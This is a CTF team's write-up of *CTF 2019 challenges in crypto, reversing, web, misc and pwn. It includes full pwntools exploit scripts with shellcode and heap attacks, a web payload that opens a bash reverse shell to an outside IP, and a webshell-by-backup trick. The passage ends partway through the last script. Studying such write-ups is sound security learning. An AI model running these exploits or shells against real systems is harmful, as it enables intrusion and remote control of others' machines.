---
title: "*ctf writeups"
category: "crypto"
subcategory: "aes"
type: "writeup"
tags: ["crypto", "aes", "cbc", "xor", "prng", "heap", "sqli", "nosql-injection", "upx", "obfuscation", "eval", "exec", "mongodb"]
summary: "It's recommended to read our responsive web version of this writeup."
source:
  name: "balsn/ctf_writeup"
  url: "https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20190427-%2Actf/README.md"
ctf:
  name: "*ctf"
  year: 2019
---

## Source

- **CTF:** *ctf 2019
- **Repository:** [balsn/ctf_writeup](https://github.com/balsn/ctf_writeup)
- **File:** <https://github.com/balsn/ctf_writeup/blob/f9d99dc0f446376cb8a4882d09d80a37c8fa79cf/20190427-%2Actf/README.md>

---
# \*CTF 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190427-*ctf/) of this writeup.**


 - [*CTF 2019](#ctf-2019)
   - [Crypto](#crypto)
     - [notfeal](#notfeal)
     - [notcurves](#notcurves)
     - [babyprng1](#babyprng1)
     - [babyprng2](#babyprng2)
   - [Reverse](#reverse)
     - [yy](#yy)
     - [fanoGo](#fanogo)
     - [Obfuscating Macros II](#obfuscating-macros-ii)
     - [Matr1x](#matr1x)
   - [Web](#web)
     - [solve_readflag (not a challenge)](#solve_readflag-not-a-challenge)
       - [Solution 1: Trap the SIGALRM signal](#solution-1-trap-the-sigalrm-signal)
       - [Solution 2: mkfifo trick](#solution-2-mkfifo-trick)
     - [996game](#996game)
     - [mywebsql](#mywebsql)
     - [EchoHub (unsolved)](#echohub-unsolved)
   - [Misc](#misc)
     - [homebrewEvtLoop--](#homebrewevtloop--)
     - [homebrewEvtLoop#](#homebrewevtloop)
     - [babyflash](#babyflash)
     - [Sokoban](#sokoban)
     - [otaku](#otaku)
     - [She](#she)
   - [Pwn](#pwn)
     - [blindpwn](#blindpwn)
     - [quicksort](#quicksort)
     - [girlfriend](#girlfriend)
     - [upxofcpp](#upxofcpp)
     - [heap master](#heap-master)
     - [OOB](#oob)
       - [Vulnerability](#vulnerability)
       - [Exploitation](#exploitation)
     - [babyshell](#babyshell)
     - [hack_me](#hack_me)


## Crypto

### notfeal
It a service which gives us 50 ciphertext of our chosen plaintext, then it gives us the encrypted flag.
It's a typical setting of chosen plaintext attack.
We found an attack on FEAL in this [link](http://theamazingking.com/crypto-feal.php).
It is well written and easy to understand, so I won't repeat the algorithm and analysis here.

However, the cipher in this challenge is slightly different from FEAL.
The output of round function `fbox` is reversed, and the direction of round function is left to right
(i.e. `l, r = r, fbox(l ^ ks[i]) ^ l`)
Fortunately, since the difference of `fbox` is only about the position of bytes, the differential characteristic is still perserved in this modified FEAL.
Use the following input differential:


```
Round4: 00000000  80800000
Round3: 80800000  80800000
Round2: 00000002  00000002
Round1:  random  (00000002 ^ random)

```

The output differential will be `00000002`.
Implement the algorithm in the link above, and get the flag.

### notcurves
The challenge is broken :<

Our goal is:


```
R = self.recvpoint(30)
(u,v) = R
print R
if (u*v)%p == 0:
    self.dosend("%s\n" % FLAG)

```

where the input function `recvpoint` is:

```
def recvpoint(self, sz):
    try:
        ...
    except:
        res = ''
        x = 0
        y = 0
    return (x,y)

```
So just send some garbage to get the flag.

### babyprng1
This is an coding chal. There are several useful command.
`pc` : program counter
`stack` : initialized with random bits
`out` : output
1. `\x00`: out.append(stack[-1])
2. `\x01`: if stack[-1] == 1 then pc++
3. `\x02`: delete stack[-1]
4. `\x03`, `\x04`, `\x05`: stack[-1] (&=, |=, ^=) stack[-2]
5. `\x10` ~ `\x30`: jmp to pc + command - 0x10
6. `\x30` ~ `\x50`: jmp to pc - command + 0x30

There are many possible solutions. I decided     to make a guess.
final payload : 

```python=
'\x02'*8 + '\x00\x05'*2 + '\x35'

```

flag : `*ctf{23bb9d2dc5eebadb04ea0f9cfbc1043f}`

### babyprng2

1. `\x00`: out.append(pop())
2. `\x01`: if stack[-1] == 1 then pc++
3. `\x02`: stack[-1] &= stack[-2]
4. `\x03`: stack[-1] |= stack[-2]
5. `\x04`: stack[-1] ^= stack[-2]
6. `\x06`: pop()
7. `\x30` ~ `\x50`: jmp to pc - command + 0x30

First loop (Ensure last two bits are [01 or 11] )

```python=
'\x03\x01\x06\x01\x34'

```

Second loop (transfer the last 2 bits [01 or 11] into [01 or 10] then pop out)

```python=
'\x03\x04\x00\x00\x39'

```
payload : `03010601340304000039`

flag : `*ctf{e48af588d4b80ade5ad44a8b5c90d222}`

## Reverse
### yy
The parser behave as following:
1. Splits the string inside `*ctf{}` with `_`
2. Substitude each character using a table called `box`
3. Encrypt each segment with AES CBC
4. Compare with a precomputed ciphertext.


```
from Crypto.Cipher import AES
import string


with open('yy', 'rb') as f:
    raw = f.read()

ctx = raw[0x6020:][:0xA0]
iv, ctx = ctx[:16], ctx[16:]
box = raw[0x62e0:][:36]
aes = AES.new(raw[0x60c0:][:16], AES.MODE_CBC, iv)
mapping = {e: c for e, c in zip(box, string.ascii_lowercase + string.digits)}
print(''.join(mapping.get(e, '.') for e in aes.decrypt(ctx)))

```

Decrypt them and remove the padding of each chunk manually.

### fanoGo
Behavior:
1. Decode our input using fano encoding.
2. Compare the result with `If you cannot read ... your acquaintances.`

We found a function for encoding in the program, and the signature is same as the decoding one.

```
.text:000000000045C970 ; void __cdecl fano___Fano__Encode(fano_Fano_0 *f, string plain, string _r1)
.text:000000000045C4F0 ; void __cdecl fano___Fano__Decode(fano_Fano_0 *f, string Bytes, string _r1)

```

So I just
1. Set a breakpoint at fano___Fano__Decode
2. Input the target string
3. Force jump to fano___Fano__Encode
4. Dump the result from memory to get the payload


### Obfuscating Macros II
The code is shattered into 92 segments, and the connection between is calculated in runtime using a stack.
Since the jump target is not static, IDA cannot recognize them.
One possible solution is to record a execution trace and set those jump target.
But I try to do it manually.

Each segment has a id, and there's a table constructed in runtime that map the index to segment's code address.
There's 3 special tags:
* Segment 91 will pop a segment number from stack D0, and jump to that segment.
* Segment 1 is the start segment
* Segment 0 is the end segment

I dump the asm from IDA, and clean it up with text editor and some python script.


After clean up those static jump (i.e. jmp lookup(n)), it looks like:

```
.. cat rev
loc_401108 ; ---------------------------------------------------------------------------
loc_401112 loc_401112:
loc_401112                 mov     [rbp+var_130], 2
loc_40111D                 lea     rdx, [rbp+var_130]
loc_401124                 lea     rax, [rbp+var_D0]
loc_40112B                 mov     rsi, rdx
loc_40112E                 mov     rdi, rax
loc_401131                 call    push
loc_40115D                 jmp     switch
loc_4011B5 ; ---------------------------------------------------------------------------
loc_4011BF loc_4011BF:
loc_4011BF                 lea     rdx, [rbp+var_1A8]
loc_4011C6                 lea     rax, [rbp+var_120]
loc_4011CD                 mov     rsi, rdx
loc_4011D0                 mov     rdi, rax
loc_4011D3                 call    push_
loc_4011FB                 jmp     switch
loc_401200 ; ---------------------------------------------------------------------------
loc_40120A loc_40120A:
loc_40120A                 mov     [rbp+var_130], 4
loc_401215                 lea     rdx, [rbp+var_130]
loc_40121C                 lea     rax, [rbp+var_D0]
loc_401223                 mov     rsi, rdx
loc_401226                 mov     rdi, rax
loc_401229                 call    push
loc_401251                 jmp     switch
loc_4012AC ; ---------------------------------------------------------------------------

```

There are a lot of segments looks like this:


```
loc_401108 ; ---------------------------------------------------------------------------
loc_TAG001
loc_40115D                 jmp     loc_TAG002
loc_401138 ; ---------------------------------------------------------------------------

loc_401200 ; ---------------------------------------------------------------------------
loc_TAG002
loc_401251                 jmp     loc_TAG004
loc_4012AC ; ---------------------------------------------------------------------------

```

Replace those alias segment can reduce the size a lot.

Next, some segment looks like:

```
loc_401BE9 ; ---------------------------------------------------------------------------
loc_TAG01B loc_TAG01B:
loc_401CBE                 call    push(loc_TAG018, var_D0)
loc_401CC3                 jmp     loc_TAG00C
loc_401CF6 ; ---------------------------------------------------------------------------
loc_TAG018 loc_TAG018:
loc_401D1F                 call    push(loc_TAG019, var_D0)
loc_401D24                 jmp     loc_TAG012
loc_401D57 ; ---------------------------------------------------------------------------

```

Connect those segment to merge them. Now we have some segments looks like:


```
loc_TAG024 loc_TAG024:
loc_402057                 call    push(loc_TAG020, var_D0)
loc_401E49                 call    peek(var_120)
loc_401E4E                 mov     rax, [rax]
loc_401E51                 mov     [rbp+var_1A0], rax
loc_401E7B                 jmp     switch

```

The jump target can be determinated now, it's `loc_TAG020` in the example above.

After merge all those segments, we have the following pseudo code:


```
loc_TAG056 def func (X, Y):
loc_TAG059     for _ in range(0x400):
loc_TAG047         if var_X & 1 == 0:
loc_401F55             var_Y ^= ~var_X
                   else:
loc_40153C             var_Y ^= var_X
loc_4018E2         var_X = ~var_X

loc_402607         var_XX = var_X & 8000000000000000h
loc_402718         var_YY = var_Y & 8000000000000000h
loc_4026FD         var_X <<= 1
loc_402A31         var_Y <<= 1
loc_TAG032         if var_YY:
loc_40285A             var_X |= 1
loc_TAG038         if var_XX:
loc_402B50             var_Y |= 1

loc_402E90         tmp = var_Y
loc_4018E2         var_Y += var_X
loc_4018E2         var_X = tmp

loc_402607         var_XX = var_X & 8000000000000000h
loc_402718         var_YY = var_Y & 8000000000000000h
loc_4026FD         var_X <<= 1
loc_402A31         var_Y <<= 1
loc_TAG032         if var_YY:
loc_40285A             var_X |= 1
loc_TAG038         if var_XX:
loc_402B50             var_Y |= 1

loc_403D45     return (var_X, var_Y)

assert func(X, Y) == (0xA1E8895EB916B732, 0x50A2DCC51ED6C4A2)

```

Undo those operations to get the flag.


### Matr1x
The program has a lot of junk opcode, we patch several things to make IDA able to decompile it:
1. Restore call opcode from jmp
2. Remove `xor/sub x, x; jnz` since the jump will never be taken.
3. Remove `[ebp ([+-] bbb*c)? [+-] X]` for those `X > 0x10000`
4. There are some constants in `0x13280`, patch those mov op with mov-immediate op. (Remember to clear relocation entries).

Now, IDA is able to decompile it.
Behavior:
1. Group every two bytes to a single int in our input.
2. Do some matrix premutation and rotation on off_13200 depends on our input.
3. Check the sum of column 0, 2, 4, 6, 8 and 1, 3, 4, 5, 7 is equals to two precomupted values for each row.
4. Multiply with matrix off_13218 to generate the flag.

Since value inside matrix off_13200 won't change. we can bruteforce possible index that can satisfy the constraint.
The search space is `54C5 = 3162510`.
Odd part of row 3 has two possible index, but we can know which one is correct because there should be one common element between even part.

Now, bruteforce the order of these elements that can produce printable flag, and filter them manually.

## Web

### solve_readflag (not a challenge)

All the web challenge requires execute `/readflag` to get the flag. This executable will ask the user to compute a simple math. The timeout is very short so the intended way to solve it is to write a script. However we're too lazy to to that.

#### Solution 1: Trap the SIGALRM signal

> treetree


```shell
$ trap "" 14 && /readflag 
Solve the easy challenge first (((((-623343)+(913340))+(-511878))+(791102))-(956792)) 
input your answer: -387571 
ok! here is your flag!! 
...

```

#### Solution 2: mkfifo trick

> kaibro


```shell
$ mkfifo pipe
$ cat pipe | ./readflag |(read l;read l;echo "$(($l))" > pipe;cat)
input your answer: 
ok! here is your flag!! 
...

```

### 996game

This challenge is built from [Phaser](https://phaser.io/). It's basically HTML5 RPG game. 

In the landing page `/`, we can see this hint in the source 


```htmlmixed
<!-- forked from https://github.com/Jerenaux/phaserquest,and I modified some files to make the game more fun. :P  -->

```

The only difference is in `GameServer.js`.


```diff
js/server/GameServer.js
279,284c279
<         if(err) {
<         if(!doc) {
<         eval(err.message.split(':').pop());
<         }
<         throw err;
<     }
---
>         if(err) throw err;
286c281,282
<         return;
---
>             GameServer.server.sendError(socket);
>             return;
753c749
< };
---
> };
\ No newline at end of file

```

So let's take look at the source code of `http://34.85.27.91:10081/js/server/GameServer.js`:


```javascript
var ObjectId = require('mongodb').ObjectID;

GameServer.loadPlayer = function(socket,id){
    GameServer.server.db.collection('players').findOne({_id: new ObjectId(id)},function(err,doc){
        if(err) {
	    if(!doc) {
		eval(err.message.split(':').pop());
	    }
	    throw err;
	}
        if(!doc) {
	    return;
        }
        var player = new Player();
        var mongoID = doc._id.toString();
        player.setIDs(mongoID,socket.id);
        player.getDataFromDb(doc);
        GameServer.finalizePlayer(socket,player);
    });
};

```

In order to trigger the `eval()`, we have to make the `findOne` throw an error. However, since the id is first converted to `ObjectID`, it's not as simple as it seems. Note the error here is thrown by `ObjectId` rather than `findOne()`.


```javascript
> var ObjectId = require('mongodb').ObjectID;
undefined
> new ObjectId("foo")
Error: Argument passed in must be a single String of 12 bytes or a string of 24 hex characters
    at new ObjectID (/home/bookgin/test/node_modules/bson/lib/bson/objectid.js:59:11)
> new ObjectId({$gt: 1})
Error: Argument passed in must be a single String of 12 bytes or a string of 24 hex characters
    at new ObjectID (/home/bookgin/test/node_modules/bson/lib/bson/objectid.js:59:11)

```

The argument has to be a String of 12 or 24 bytes. However, I wonder if we can bypass the validation function in ObjectId.
Let's check ObjectId's [source code](https://github.com/mongodb/js-bson/blob/master/lib/objectid.js#L339-L342) first. In the `isValid(id)` function, it uses so-called [Duck-Typing](https://en.wikipedia.org/wiki/Duck_typing) to determine it's valid or not.


```javascript
// Duck-Typing detection of ObjectId like objects
if (id.toHexString) {
    return id.id.length === 12 || (id.id.length === 24 && checkForHexRegExp.test(id.id));
}

...

```

Thus we can easily create an object with those attributes. This object can bypass the `isValid(id)` function.


```javascript
var oid = { 
   toHexString: 'foo',
   id: { 
       length:12
   },
   bar: 'bazz'
}

```

To throw an error in `findOne` is trivial, basically the idea is similar to NoSQL injection. Here is the final payload. Launch this html with `chromium --disable-web-security` to RCE.


```htmlmixed
<script src="http://34.85.27.91:10081/socket.io/socket.io.js"></script>
<script>
  var socket = io('http://34.85.27.91:10081');
  socket.on('connect', function(){});
  socket.emit('init-world', {'new': false, 
    'id': {
      "$gt":1,
      "require('child_process').exec('bash -c \"bash -i >& /dev/tcp/240.240.240.240/1337 0>&1\"')":1,
      toHexString:1,
      id:{"length": 12}
    }, 
    'clientTime': Date.now()
  });
</script>

```

### mywebsql

[MyWebSQL ver 3.7 remote code execution](https://github.com/eddietcc/CVEnotes/blob/master/MyWebSQL/RCE/readme.md)

1. Write PHP code to table
2. Execute `Backup database` function and set filename to `anything.php`
3. You have a webshell now: `/backups/anything.php`

### EchoHub (unsolved)

**This is the only one challenge we didn't solve**. Only one step from all-kill (sob).

The idea is to leverage `php-fpm` to bypass php `disable_functions`. @kaibro exploited [php-fpm](https://balsn.tw/ctf_writeup/20190323-0ctf_tctf2019quals/#wallbreaker-easy) to bypass `disable_functions` and `open_basedir` in Wallbreaker Easy challenge of the 0CTF/TCTF before, yet @bookgin is not familar with that technique :P.

For the writeup of this challenge, please refer to the [official writeup](https://github.com/sixstars/starctf2019/tree/master/web-echohub).


## Misc
### homebrewEvtLoop--

The server looks like this:

```
# python2
session = {'log': '*ctf{0-9a-zA-Z_\[\]}'}

# save sys.stdin and sys.stderr to closure's local and then clear them.
switch_safe_mode()

event, args = inputStr.split('114514')

try:
    print eval(event)([args])
except:
    print 'exception'

```
We can only input letters, digits and `_[]`.

The `eval` looks powerful, but we can't use parentheses, so no function call :<
And there's no interesting builtin function we can call because the arg will be wrap in an array.

The `input` function can take an array as argument, but our stdin was closed, so it doesn't work.

The first thing is to access the flag. We can't write a string `'log'` in the code, but we can use the args to get a string:


```
session[args[0]] 114514log

```

Next, we need to find a way leak the content of the flag,, we can use list comprehension to test the character:


```
[[ping_handler]for[c]in[[session[args[0]][1]]]if[c]in[[event[19]]]][0][0]114514log

```

Try all 256 possibilities to leak the flag.

### homebrewEvtLoop#
We found that we can use list comprehension in last challenge.
In python2, the variable scope inside list comprehension is same as outside, which means we can overwrite the variable using list comp.


```
[[ping_handler]for[valid_event_chars]in[[1]]][0][0]114514

```

But the stdin is closed, we need to find a way to restore it:


```
[[load_flag_handler]for[flag2]in[[switch_safe_mode]]][0][0]114514

```

And then overwrite `exit` to bypass the input constraints.


```
hashlib.sha1(input).hexdigest() == "f270"
> aaaaaaaaaaaaaRZY
$ [[load_flag_handler]for[exit]in[[ping_handler]]for[flag2]in[[switch_safe_mode]]][0][0]114514
done
hashlib.sha1(input).hexdigest() == "a2d9"
> aaaaaaaaaaaaaow1
$ __import__("os").system("`cat flag`")114514
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
invalid request
sh: 1: *ctf{pYth0n2-f3@tur3_R19ht?}: not found
exception
hashlib.sha1(input).hexdigest() == "ae82"
> lost sys.stderr

```

### babyflash

Given a `.swf` file, there is a flashlight animation with a very weird sound. At first we thought the flashlight is morse code, but turned out it is just some kind of encoding. We extract all the frames from the `.swf` file and get 441 images. Change white color to `blocks` and black to `spaces`. Resize the result:
![](https://i.imgur.com/W2Sez7u.png)

A QR code, and the result is only first half of the flag: `*ctf{half_flag_&`.

We used audacity to open the `.swf` file and view the spectogram and get the second half of the flag.

![](https://i.imgur.com/XlyxXmQ.png)

Flag: `*ctf{half_flag_&&_the_rest}`

### Sokoban
This is a chal require you to write a sokoban solver, which can solve 25 problems in 60 seconds. Not sure what happened but we can actually try like 5 minutes within an connection. 
We use [this](https://github.com/tonyling/skb-solver) with a minor improve (add parallel with openmp) to find best solution with BFS, and also keep a dictionary containing all solved problems.


```python=

host = '34.92.121.149'
port = 9091
while 1:
    try:
        r = remote(host, port)
        r.recvuntil('one box\n')
        try:
            solved_set = pickle.load(open('solved_set', 'rb'))
        except:
            solved_set = {}
        origin_m = 'a'
        ret = 'dd'
        for i in range(25):
            print ('solving : ', i)
            try:
                tmp_m = r.recvuntil(b'tell')[:-5]
                origin_m = tmp_m
            except EOFError:
                pickle.dump(solved_set, open('solved_set', 'wb'))
                raise SyntaxError
            if origin_m in solved_set:
                print ('already solved')
                r.sendline(solved_set[origin_m])
                r.recvuntil('\n')
                r.recvuntil('\n')
                continue
            m = origin_m.strip().split(b'\n')
            rows = len(m)
            cols = len(m[0])
            m = '\n'.join(m)
            m = m.replace('8', '#').replace('1', '.').replace('4', '@').replace('2', '$').replace('0', ' ')
            f = open('now_problem', 'w')
            f.write(str(rows) + '\n' + m + '\n')
            f.close()
            # test.sh simply do some parsing and run the solver
            os.system('./test.sh')
            f = open('log', 'r')
            x = f.read().split('\n')
            f.close()
            solved = False
            for line in x:
                if 'Solution' not in line:
                    continue
                ret = line[10:].replace(', ', '').replace('d', 's').replace('r', 'd').replace('l', 'a').replace('u', 'w')
                print ('solution : ', ret)
                if len(ret) > 1:
                    solved = True
                break
            if solved:
                solved_set[origin_m] = ret
                r.sendline(ret)
                if i == 24:
                    r.interactive()
                r.recvuntil('\n')
                r.recvuntil('\n')
            else:
                pickle.dump(solved_set, open('solved_set', 'wb'))
                raise EOFError
    except EOFError:
        r.close()
    except SyntaxError:
        r.close()
    except:
        exit()


```
after some time (about 2 hours) of running, we get the flag.
flag : `*ctf{Oh!666_What_a_powerful_algorithm!$_$}`

### otaku

It's a classic misc challenge in CTF.

1. Either fix the corrputed zip using `zip -FF Corrupted.zip --out New.zip` or guess the password from the plaintext file `Anime_Intro.doc`. 
2. The password is `Elemental Evocation`, one of the card name in Rastakhan's Rumble from Hearthstone. It's mentioned in `Anime_Intro.doc`.
3. The second zip containing `flag.png` is protected by password.
4. Apply known plaintext attack: based on the uncompressed size of `last word.txt`, we know they are identical files. The content of `last word.txt` can be extracted from `Anime_Intro.doc`.
5. In the comment of the encrypted zip, it's compressed using Winrar 5.70 beta 2 in Windows. Using linux to create a zip with plain text of `last words.txt` will fail to extract the key. We waste a lot of time here. Also the doc is GBK-encoded, as mentioned in the hint. 
6. Therefore, after using the same environment (Windows) and the identical version of Winrar to create the zip, we can extract the password with `pkcrack`.
7. `pkcrack -P plain_last_words.zip -p 'last words.txt' -C flag.zip -c 'last words.txt' -d decrypt.zip`. We have the key `key0=106d3a93, key1=6c0cc013, key2=338e8d6f`.
8. It's not done yet. In the `decrypt.zip`, the `flag.png` is actually a stego challenge.
9. Since the challenge is already solved by many teams, we guess it's some basic stego technique. The answer is to extract LSB and get the flag.

### She
We were given a game made by RPGMaker.

It's possible to use cheat engine to defeat the chicken to get into the dungeon where has lots of chests.

Or, we can just use a hidden passage at the second bookshelf counted from right side in the tent of businessman.

Anyway, some of the chests can be opened, but others are impossible to be opened, this can be verify by opening the game in debug mode.

open debug mode in cmd:


```
Game.exe debug

```

We can open the 3rd, 8th, 2nd, 1st, 5th, 7th door in sequence.

Then,the result of arranging the number in the chest by the order of the rooms is `213697`, the flag is `*CTF{md5(213697)}`

Which is:
`*CTF{d6f3fdffbcb462607878af65d059f274}`

## Pwn

### blindpwn

Given checksec information (all protection disabled), and the libc version. Without the binary, we can only start guessing :/

Input `'A'*40` with newline will leak some information. This give me an intuition that the last byte of `RIP` is overwriten by `\x0a`. Then I found `'A'*40+p64(0x40070a)` will have the same behavior, which prove that my intuition is correct. Then I found that `'A'*40+p64(0x4006f6)` will print the stack information and wait for an input. From the stack infomation, I can get the libc address. Since we know the libc version, and we know where to control the `RIP`, I can overwrite the `RIP` with one_gadget.

Exploit:


```python
#!/usr/bin/env python

from pwn import *

host = '34.92.37.22'
port = 10000

r = remote(host, port)
r.sendlineafter('pwn!\n', 'A'*0x28+p64(0x4006f6))
l = r.recv()

for i in range(len(l)//8):
    if i == 9:
        libc = u64(l[i*8:i*8+8])

libc = libc - 240 - 0x20740 # libc_start_main
print 'libc:', hex(libc)

sleep(1)
r.sendline('a'*0x28+p64(libc+0x4526a)+p64(0)*30)

r.interactive()

```

Flag: `*CTF{Qri2H5GjeaO1E9Jg6dmwcUvSLX8RxpI7}`

### quicksort

* Gets funtion stack overflow can overwrite heap_ptr to arbitrary writes.
* Write "sh" at 0x0804A100
* Modify free_got to ret. avoid free checks
* Modify atoi_got to printf_plt. leak canary & libc
* bypass canary and get shell.

flag: `*CTF{lSkR5u3LUh8qTbaCINgrjdJ74iE9WsDX}`

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '34.92.96.238'
port = 10000

binary = "./quicksort"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  r.recvuntil("?\n")
  r.sendline("1")
  r.recvuntil(":")
  num = str(0x6873).ljust(0x10,"A")
  r.sendline(num + p32(3) + p32(0) + p32(0) + p32(0x0804A100)) # 0x0804A100 "sh"
  r.recvuntil(":")
  num = str(0x080489F1).ljust(0x10,"A")
  r.sendline(num + p32(3) + p32(0) + p32(0) + p32(0x0804A018)) # free changed to ret
  r.recvuntil(":")
  num = str(0x080484F0).ljust(0x10,"A")
  r.sendline(num + p32(3) + p32(0) + p32(0) + p32(0x804A038))  # atoi changed to printf  leak  libc & canary
  r.recvuntil(":")
  r.sendline("%15$p..%23$p..aa" + p32(4) + p32(0) + p32(0) + p32(0x804A050))
  canary = int(r.recvuntil("..")[:-2],16)
  libc = int(r.recvuntil("..")[:-2],16) - 0x18637
  print("canary = {}".format(hex(canary)))
  print("libc = {}".format(hex(libc)))
  r.recvuntil(":")
  system = libc + 0x003ada0
  r.sendline("A"*0x10 + p32(3) + p32(3) + p32(3) + p32(0x804A050) + p32(canary) + "D"*0xc + p32(system) + "D"*4 + p32(0x0804A100))
  r.interactive()


```
### girlfriend

* libc-2.29 & UAF vulnerability
* fastbin corruption 
* Modify free_hook to system and free("sh") get shell

flag: `*CTF{pqyPl2seQzkX3r0YntKfOMF4i8agb56D}`


```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '34.92.96.238'
port = 10001

def add(size,name,call):
  r.recvuntil("e:")
  r.sendline("1")
  r.recvuntil("name\n")
  r.sendline(str(size))
  r.recvuntil(":\n")
  r.send(name)
  r.recvuntil(":\n")
  r.send(call)
  pass

def show(index):
  r.recvuntil("e:")
  r.sendline("2")
  r.recvuntil(":\n")
  r.sendline(str(index))
  pass

def call(index):
  r.recvuntil("e:")
  r.sendline("4")
  r.recvuntil(":\n")
  r.sendline(str(index))
  pass

if len(sys.argv) == 1:
  r = process("./pwn")

else:
  r = remote(host ,port)

if __name__ == '__main__':
  add(0x18,"A"*8,"B") # 9
  for i in xrange(9):
    add(0x28,"A"*0x28,"B"*0xc)
  add(0x18,"A"*8 + p64(0x31),"B") # 10
  call(0)
  add(0x420,"A","B")  # 11
  add(0x18,"A","B")   # 12
  for i in xrange(7):
    call(str(i+1))
  call(8)
  call(9)
  call(8)
  for i in xrange(7):
    add(0x28,"C","D")
  add(0x28,"\xb0","D")# 20
  add(0x28,"C","D") # 21
  add(0x28,"C","D") # 22
  add(0x28,"C","D") # 23

  call(11)
  show(23)
  r.recvuntil(":\n")
  libc = u64(r.recvuntil("\np")[:-2].ljust(8,"\x00")) - 0x3b1ca0
  print("libc = {}".format(hex(libc)))

  for i in xrange(9):
    add(0x68,"A"*0x68,"B"*0xc)
  for i in xrange(7):
    call(24+i)
  call(31)
  call(32)
  call(31)
  for i in xrange(7):
    add(0x68,"A"*0x68,"B"*0xc)
  malloc_hook = libc + 0x3b1c30
  free_hook = libc + 0x00000000003b38c8
  add(0x68,p64(free_hook-0x13),"B"*0xc)
  add(0x68,"A"*0x68,"B"*0xc)
  add(0x68,"/bin/sh\x00","B"*0xc)
  system = 0x0000000000041c30 + libc
  add(0x68,"A"*0x13 + p64(system) ,"B"*0xc)
  call(42)
  r.interactive()


```
### upxofcpp

* UPX packed program heap no DEP
* UAF vulnerability & fake vtable to execute shellcode

flag: `*ctf{its_time_to_say_goodbye_to_ubuntu_16_04}`


```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '34.92.121.149'
port = 10000

binary = "./upxofcpp"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def add(index,size,num):
  r.recvuntil("e:")
  r.sendline("1")
  r.recvuntil(":")
  r.sendline(str(index))
  r.recvuntil(":")
  r.sendline(str(size))
  r.recvuntil(":")
  for i in num:
    r.sendline(str(i))


def remove(index):
  r.recvuntil("e:")
  r.sendline("2")
  r.recvuntil(":")
  r.sendline(str(index))
  pass

if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})

else:
  r = remote(host ,port)

if __name__ == '__main__':
  payload = asm("xchg rsi,rax;push rcx;pop rdi;xor edx,ebx;syscall")
  add(3,6,[0x44444444]*4 + [u32(payload[0:4])] + [u32(payload[4:])])
  add(0,10,[0x44444444]*10)
  add(1,10,[0x44444444]*10)
  add(2,10,[0x44444444]*10)
  remove(0)
  remove(1)
  remove(2)
  r.recvuntil(":")
  r.sendline("4")
  r.recvuntil(":")
  r.sendline("2")
  r.sendline("\x90"*0x100 + "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05")
  r.interactive()


```
### heap master

* Fake IO_2_1_stdout structure at mmap+0x100 with 1/16 probability.
* Unsortbin attack to overwrite global_max_fast.
* Modify stdout to mmap+0x100 with free chunk size 0x17e0 to leak libc.
* Fake IO_FILE structure at mmap+0x2000 (libc-2.24 IO_FILE attack to jump __IO_str_overflow control rip & rdi).
* Modify _IO_list_all to mmap+0x2000 with free chunk size 0x1410.
* There is `mov rcx,[rdi + 0x98];push rcx ;.....; ret;` in the middle of setcontext, so I found the __morecore function ptr to avoid program crash.
* Conduct exit to trigger IO_FILE attack. Finally I used setcontext to successfully execute open, read, write with ROP.

flag: `*CTF{You_are_4_r3al_h3ap_Master!}`

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random
host = '34.92.248.154'
port = 10000

binary = "./heap_master"
context.binary = binary
elf = ELF(binary)
try:
  libc = ELF("./libc.so.6")
  log.success("libc load success")
  system_off = libc.symbols.system
  log.success("system_off = "+hex(system_off))
except:
  log.failure("libc not found !")

def malloc(size):
  r.recvuntil(">> ")
  r.sendline("1")
  r.recvuntil(": ")
  r.sendline(str(size))
  pass

def edit(offset,data):
  r.recvuntil(">> ")
  r.sendline("2")
  r.recvuntil(": ")
  r.sendline(str(offset))
  r.recvuntil(": ")
  r.sendline(str(len(data)))
  r.recvuntil(": ")
  r.send(data)
  pass

def free(offset):
  r.recvuntil(">> ")
  r.sendline("3")
  r.recvuntil(": ")
  r.sendline(str(offset))
  pass
if len(sys.argv) == 1:
  r = process([binary, "0"], env={"LD_LIBRARY_PATH":"."})
  #r = remote("127.0.0.1" ,9999)

else:
  r = remote(host ,port)

if __name__ == '__main__':
  for i in xrange(0xe):
    edit(0xf8 + i*0x10,p64(0x201))
  for i in xrange(0x10):
    edit(0x2f8 + i*0x10,p64(0x21))
  for i in xrange(0xd):
    free(0x1d0-i*0x10)
    malloc(0x1f0)
    
  #fake IO_2_1_stdout at mmap+0x100 .  
  #need to bruteforce 1/16 probability
  edit(0x100, p64(0xfbad3c80) + p64(0)*3 + p16(0x5600)) 
  edit(0x128,p16(0x5683))
  edit(0x130,p16(0x5683))
  edit(0x138,p16(0x5683))
  edit(0x140,p16(0x5684))
  edit(0x148, p64(0)*4 + p16(0x48c0))
  edit(0x170, p64(1) + p64(0xffffffffffffffff) + p64(0) + p16(0x6760))
  edit(0x190, p64(0xffffffffffffffff) + p64(0) + p16(0x4780))
  edit(0x1a8,p64(0)*3 + p64(0x00000000ffffffff) + p64(0)*2 + p16(0x1440))


  edit(0x1008,p64(0x91))
  edit(0x1098,p64(0x21))
  edit(0x10b8,p64(0x21))
  free(0x1010)
  edit(0x1018,p16(0x67d0-0x10)) # unsortbin attack global_max_fast
